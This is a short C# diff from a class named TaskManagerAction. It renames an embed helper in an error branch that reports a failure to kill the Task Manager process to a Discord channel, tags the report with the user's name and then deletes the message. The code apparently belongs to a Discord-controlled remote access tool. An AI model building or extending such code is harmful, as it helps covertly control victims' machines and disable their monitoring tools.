@@ -29,7 +29,7 @@ public static class TaskManagerAction
             }
             catch
             {
-                var embed = EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
+                var embed = DiscordEmbed.CreateWithText(Color.Red, "Command executed with errors",
                     "Cannot kill task manager process.", Environment.UserName, null);
                 var message = DiscordStatement.CurrentChannel.SendMessageAsync(null, false, embed).Result;
                 Task.Run(() => DiscordStatement.CurrentChannel.DeleteMessageAsync(message)).Wait(10000);
